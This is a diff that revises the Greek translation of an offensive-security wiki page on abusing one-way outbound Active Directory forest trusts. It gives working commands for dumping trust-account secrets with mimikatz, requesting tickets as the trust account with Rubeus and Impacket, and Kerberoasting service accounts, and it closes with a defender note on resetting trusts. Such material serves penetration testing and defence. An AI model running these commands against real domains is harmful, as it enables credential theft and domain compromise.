@@ -1,10 +1,10 @@
-# Εξωτερικός Forest Domain - One-Way (Outbound)
+# External Forest Domain - One-Way (Outbound)
 
 {{#include ../../banners/hacktricks-training.md}}
 
-Σε αυτό το σενάριο **το domain σου** **εμπιστεύεται** ορισμένα **προνόμια** σε principals από ένα **διαφορετικό domain/forest**.
+Σε αυτό το σενάριο, **το domain σας** **εμπιστεύεται** ορισμένα **privileges** σε principals από ένα **διαφορετικό domain/forest**.
 
-## Απαρίθμηση
+## Enumeration
 
 ### Outbound Trust
 ```bash
@@ -28,7 +28,7 @@ MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
 MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
 ## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
 ```
-Αν έχετε διαθέσιμο το AD module, επιθεωρήστε επίσης απευθείας το **Trusted Domain Object (TDO)**. Αυτό σας δίνει τα ακατέργαστα trust data που βασίζονται σε LDAP και θα χρειαστείτε αργότερα όταν αποφασίζετε αν η εύκολη διαδρομή είναι **FSP/group abuse** ή **trust-account abuse**:
+Αν έχετε διαθέσιμο το AD module, εξετάστε απευθείας και το **Trusted Domain Object (TDO)**. Αυτό σας παρέχει τα raw LDAP-backed trust data που θα χρειαστείτε αργότερα, όταν αποφασίζετε αν η εύκολη διαδρομή είναι **FSP/group abuse** ή **trust-account abuse**:
 ```powershell
 # Enumerate the TDO created for the foreign forest/domain
 Get-ADObject -LDAPFilter '(objectClass=trustedDomain)' -SearchBase "CN=System,$((Get-ADDomain).DistinguishedName)" -Properties trustDirection,trustType,trustAttributes,flatName,securityIdentifier,whenCreated,whenChanged |
@@ -37,37 +37,37 @@ Select Name,flatName,trustDirection,trustType,trustAttributes,securityIdentifier
 # Fast trust hygiene check from the outbound side
 Get-ADTrust -Identity ext.local -Properties ForestTransitive,SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation
 ```
-You should also enumerate where the foreign principals from `CN=ForeignSecurityPrincipals` were actually granted access. Common wins are:
+Θα πρέπει επίσης να καταγράψετε πού ακριβώς παραχωρήθηκε πρόσβαση στα foreign principals από το `CN=ForeignSecurityPrincipals`. Συνηθισμένες περιπτώσεις είναι:
 
-- **Local admin** on a server/DC in your current domain
-- Membership in a **custom domain group** that has ACLs over users/computers/GPOs
-- Rights to modify **computer objects**, which can later become [RBCD](resource-based-constrained-delegation.md) if the trust configuration allows it
+- **Local admin** σε server/DC του τρέχοντος domain
+- Membership σε ένα **custom domain group** που διαθέτει ACLs πάνω σε users/computers/GPOs
+- Δικαιώματα τροποποίησης **computer objects**, τα οποία αργότερα μπορούν να μετατραπούν σε [RBCD](resource-based-constrained-delegation.md), εφόσον το επιτρέπει η trust configuration
 
 ## Trust Account Attack
 
-When a one-way trust is created from domain/forest **B** to domain/forest **A** (**B trusts A**), a **trust account** for **B** is created in **A**. In the outbound-trust view of **A**, this is useful because if you later compromise **B** (the trusting side), you can dump the trust secret there and authenticate back to **A** as `B$`.
+Όταν δημιουργείται one-way trust από το domain/forest **B** προς το domain/forest **A** (**B trusts A**), δημιουργείται ένα **trust account** για το **B** στο **A**. Από την outbound-trust οπτική του **A**, αυτό είναι χρήσιμο επειδή, αν αργότερα κάνετε compromise στο **B** (την trusting πλευρά), μπορείτε να κάνετε dump το trust secret εκεί και να κάνετε authenticate πίσω στο **A** ως `B$`.<sup>[[1]](#references)</sup>
 
-The critical aspect to understand here is that the password and Kerberos material for that trust account can be extracted from a Domain Controller in the **trusting** domain using:
+Το κρίσιμο σημείο εδώ είναι ότι το password και το Kerberos material για αυτό το trust account μπορούν να εξαχθούν από έναν Domain Controller στο **trusting** domain χρησιμοποιώντας:<sup>[[1]](#references)</sup>
 ```bash
 Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
 ```
-Αυτό λειτουργεί επειδή ο trust account που δημιουργείται στο **trusted** domain είναι ένα enabled principal που καταλήγει να έχει τα βασικά rights ενός κανονικού domain user εκεί. Αυτό συχνά αρκεί για να ξεκινήσεις enumerating LDAP, request tickets και να βρεις το επόμενο escalation path.
+Αυτό λειτουργεί επειδή ο trust account που δημιουργείται στο **trusted** domain είναι ένας ενεργοποιημένος principal, ο οποίος τελικά διαθέτει τα βασικά δικαιώματα ενός κανονικού domain user εκεί. Αυτό συχνά αρκεί για την έναρξη enumeration μέσω LDAP, το request tickets και την εύρεση του επόμενου escalation path.<sup>[[1]](#references)</sup>
 
-Σε ένα scenario όπου το `ext.local` είναι το **trusting** domain και το `root.local` είναι το **trusted** domain, δημιουργείται ένας user account με το όνομα `EXT$` μέσα στο `root.local`. Το dumping των trust keys από το `ext.local` αποκαλύπτει credentials που μπορούν να χρησιμοποιηθούν ως `root.local\EXT$` εναντίον του `root.local`:
+Σε ένα σενάριο όπου το `ext.local` είναι το **trusting** domain και το `root.local` είναι το **trusted** domain, δημιουργείται ένας user account με το όνομα `EXT$` μέσα στο `root.local`. Το dumping των trust keys από το `ext.local` αποκαλύπτει credentials που μπορούν να χρησιμοποιηθούν ως `root.local\EXT$` εναντίον του `root.local`:<sup>[[1]](#references)</sup>
 ```bash
 lsadump::trust /patch
 ```
-Ακολουθώντας αυτό, χρησιμοποιήστε το εξαγόμενο **RC4** key για να αυθεντικοποιηθείτε ως `root.local\EXT$` μέσα στο `root.local`:
+Στη συνέχεια, χρησιμοποιήστε το εξαγόμενο **RC4** key για να κάνετε authenticate ως `root.local\EXT$` μέσα στο `root.local`:<sup>[[1]](#references)</sup>
 ```bash
 .\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
 ```
-Στη συνέχεια, απαριθμήστε το trusted domain ως εκείνο το principal, για παράδειγμα κάνοντας Kerberoasting σε ένα υψηλής αξίας SPN στο `root.local`:
+Στη συνέχεια, κάνε enumerate το trusted domain ως αυτό το principal, για παράδειγμα με Kerberoasting ενός high-value SPN στο `root.local`:<sup>[[1]](#references)</sup>
 ```bash
 .\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
 ```
 ### Από Linux
 
-Αν ανακτήσατε το **RC4** trust-account key, η ίδια ιδέα λειτουργεί από Linux με το Impacket:
+Αν ανακτήσατε το κλειδί του trust account **RC4**, η ίδια ιδέα λειτουργεί από Linux με το Impacket:
 ```bash
 python getTGT.py -dc-ip dc.root.local root.local/EXT\$ -hashes :<RC4>
 export KRB5CCNAME=EXT\$.ccache
@@ -78,41 +78,41 @@ GetUserSPNs.py -request -k -no-pass -dc-ip dc.root.local root.local/EXT\$ -outpu
 # Or reduce noise and request only one user
 GetUserSPNs.py -request-user svc_sql -k -no-pass -dc-ip dc.root.local root.local/EXT\$
 ```
-Αν το **RC4** δεν γίνεται αποδεκτό, κάνε fallback στο ανακτημένο **cleartext password** (ή στα παραγόμενα **AES** keys) και επαναχρησιμοποίησε τα συνήθη workflows [Over-Pass-the-Hash / Pass-the-Key](over-pass-the-hash-pass-the-key.md) και [Kerberoast](kerberoast.md) από αυτό το foothold.
+Αν το **RC4** δεν γίνει αποδεκτό, χρησιμοποίησε ως εναλλακτική το ανακτημένο **cleartext password** (ή τα παραγόμενα **AES** keys) και επανάχρησιμοποίησε τα συνήθη workflows [Over-Pass-the-Hash / Pass-the-Key](over-pass-the-hash-pass-the-key.md) και [Kerberoast](kerberoast.md) από αυτό το foothold.
 
-### Key material gotchas
+### Παγίδες στο key material
 
-Μην μπερδεύεις τα **trust keys** με τα **trust-account credentials**:
+Μην μπερδεύεις τα **trust keys** με τα **trust-account credentials**:<sup>[[1]](#references)</sup>
 
-- Σε ένα one-way trust, και οι δύο πλευρές αποθηκεύουν ένα **TDO**, αλλά το πραγματικό **`EXT$` user account υπάρχει μόνο στο trusted domain**.
-- Το τρέχον trust-account password αντικατοπτρίζεται στο TDO trust secret (`NewPassword` / current trust key).
-- Το **RC4** trust key είναι το πιο εύκολο artifact για επαναχρησιμοποίηση στο `asktgt` ως trust account· σε default setups αυτό είναι συνήθως το working enctype, επειδή το trust account συχνά έχει κενό `msDS-SupportedEncryptionTypes`.
-- Αν σκέφτεσαι με όρους **AES trust keys**, θυμήσου ότι δεν είναι εναλλάξιμα με τα trust-account AES keys, επειδή τα salts διαφέρουν.
+- Σε ένα one-way trust, και οι δύο πλευρές αποθηκεύουν ένα **TDO**, αλλά ο πραγματικός λογαριασμός χρήστη **`EXT$` υπάρχει μόνο στο trusted domain**.
+- Το τρέχον password του trust account αποτυπώνεται στο TDO trust secret (`NewPassword` / current trust key).
+- Το **RC4** trust key είναι το ευκολότερο artifact για επανάχρηση με `asktgt` ως trust account. Σε default setups, αυτό είναι συνήθως το λειτουργικό enctype, επειδή το trust account συχνά έχει κενό `msDS-SupportedEncryptionTypes`.
+- Αν σκέφτεσαι με όρους **AES trust keys**, θυμήσου ότι δεν είναι interchangeable με τα AES keys του trust account, επειδή τα salts διαφέρουν.
 
-Άρα, για την technique σε αυτή τη σελίδα, προτίμησε είτε το dumped **RC4** material είτε το ανακτημένο **cleartext** password.
+Επομένως, για την τεχνική αυτής της σελίδας, προτίμησε είτε το dumped **RC4** material είτε το ανακτημένο **cleartext** password.<sup>[[1]](#references)</sup>
 
-### Gathering cleartext trust password
+### Συλλογή του cleartext trust password
 
-Στο προηγούμενο flow χρησιμοποιήθηκε το trust hash αντί για το **cleartext password** (το οποίο επίσης **dumped by mimikatz**).
+Στο προηγούμενο flow χρησιμοποιήθηκε το trust hash αντί για το **cleartext password** (το οποίο επίσης γίνεται **dump από το mimikatz**).<sup>[[1]](#references)</sup>
 
-Το cleartext password μπορεί να ληφθεί μετατρέποντας το \[ CLEAR ] output από το mimikatz από hexadecimal και αφαιρώντας τα null bytes `\x00`:
+Το cleartext password μπορεί να ληφθεί μετατρέποντας το output \[ CLEAR ] από το mimikatz από hexadecimal και αφαιρώντας τα null bytes `\x00`:<sup>[[1]](#references)</sup>
 
-![Trust Account Attack - Gathering cleartext trust password: The cleartext password can be obtained by converting the ( CLEAR ) output from mimikatz from hexadecimal and removing null...](<../../images/image (938).png>)
+![Trust Account Attack - Συλλογή του cleartext trust password: Το cleartext password μπορεί να ληφθεί μετατρέποντας το output ( CLEAR ) από το mimikatz από hexadecimal και αφαιρώντας τα null...](<../../images/image (938).png>)
 
-Μερικές φορές, όταν δημιουργείται μια trust relationship, πρέπει ο χρήστης να πληκτρολογήσει ένα password για το trust. Σε αυτή την επίδειξη, το key είναι το αρχικό trust password και επομένως αναγνώσιμο από άνθρωπο. Καθώς το key αλλάζει (default: every 30 days), το cleartext συνήθως παύει να είναι αναγνώσιμο από άνθρωπο, αλλά παραμένει τεχνικά usable.
+Μερικές φορές, κατά τη δημιουργία μιας trust relationship, ο χρήστης πρέπει να πληκτρολογήσει ένα password για το trust. Σε αυτή την επίδειξη, το key είναι το αρχικό trust password και επομένως είναι human readable. Καθώς το key περιστρέφεται (default: κάθε 30 ημέρες), το cleartext συνήθως παύει να είναι human readable, αλλά παραμένει τεχνικά usable.<sup>[[1]](#references)</sup>
 
-Το cleartext password μπορεί να χρησιμοποιηθεί για να γίνει regular authentication ως trust account, ως εναλλακτική στο να ζητηθεί ένα TGT με το Kerberos secret key του trust account. Εδώ, querying `root.local` από `ext.local` για μέλη των `Domain Admins`:
+Το cleartext password μπορεί να χρησιμοποιηθεί για regular authentication ως trust account, ως εναλλακτική στην αίτηση ενός TGT με το Kerberos secret key του trust account. Εδώ, γίνεται query στο `root.local` από το `ext.local` για μέλη των `Domain Admins`:<sup>[[1]](#references)</sup>
 
-![Trust Account Attack - Gathering cleartext trust password: The cleartext password can be used to perform regular authentication as the trust account, an alternative to requesting a TGT...](<../../images/image (792).png>)
+![Trust Account Attack - Συλλογή του cleartext trust password: Το cleartext password μπορεί να χρησιμοποιηθεί για regular authentication ως trust account, ως εναλλακτική στην αίτηση ενός TGT...](<../../images/image (792).png>)
 
-### Practical limitations
+### Πρακτικοί περιορισμοί
 
 > [!WARNING]
-> Trust accounts are awkward principals. Interactive logons such as **RUNAS / console / RDP** are not the expected path here, and **NTLM** authentication attempts can fail with `STATUS_NOLOGON_INTERDOMAIN_TRUST_ACCOUNT`. Plan for **Kerberos network logons** (`asktgt`, LDAP, CIFS, Kerberoast) instead.
+> Τα trust accounts είναι awkward principals. Interactive logons όπως **RUNAS / console / RDP** δεν αποτελούν την αναμενόμενη διαδρομή εδώ, ενώ οι απόπειρες authentication μέσω **NTLM** μπορεί να αποτύχουν με `STATUS_NOLOGON_INTERDOMAIN_TRUST_ACCOUNT`. Προτίμησε **Kerberos network logons** (`asktgt`, LDAP, CIFS, Kerberoast).<sup>[[1]](#references)</sup>
 
-### Persistence / cleanup note
+### Σημείωση για persistence / cleanup
 
-Αν οι defenders αντιληφθούν ότι το trusting domain έχει παραβιαστεί, θα πρέπει να κάνουν rotate το trust secret και στις **δύο πλευρές** με `netdom trust ... /resetOneSide ...`. Από πλευράς operator αυτό έχει σημασία επειδή ένα **manual reset invalidates the old trust material immediately**, ενώ η κανονική trust-password rotation κρατά τα current/previous values διαθέσιμα κατά τη διάρκεια του rollover.
+Αν οι defenders αντιληφθούν ότι το trusting domain έχει παραβιαστεί, πρέπει να κάνουν rotate το trust secret **και στις δύο πλευρές** με `netdom trust ... /resetOneSide ...`. Από την πλευρά του operator, αυτό έχει σημασία επειδή ένα **manual reset ακυρώνει αμέσως το παλιό trust material**, ενώ το normal trust-password rotation διατηρεί τις τρέχουσες/προηγούμενες τιμές κατά τη διάρκεια του rollover.<sup>[[2]](#references)</sup>
 ```bash
 # Run once from the trusted side
 netdom trust root.local /domain:ext.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*
@@ -122,7 +122,7 @@ netdom trust ext.local /domain:root.local /resetOneSide /passwordT:<NEWPASS> /us
 ```
 ## Αναφορές
 
-- [https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-7](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-7)
-- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-trust](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-trust)
+- [1] [SID filter ως security boundary μεταξύ domains; (Μέρος 7) – Trust account attack – από trusting σε trusted](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-7)
+- [2] [AD Forest Recovery – Επαναφορά trust password](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-trust)
 
 {{#include ../../banners/hacktricks-training.md}}
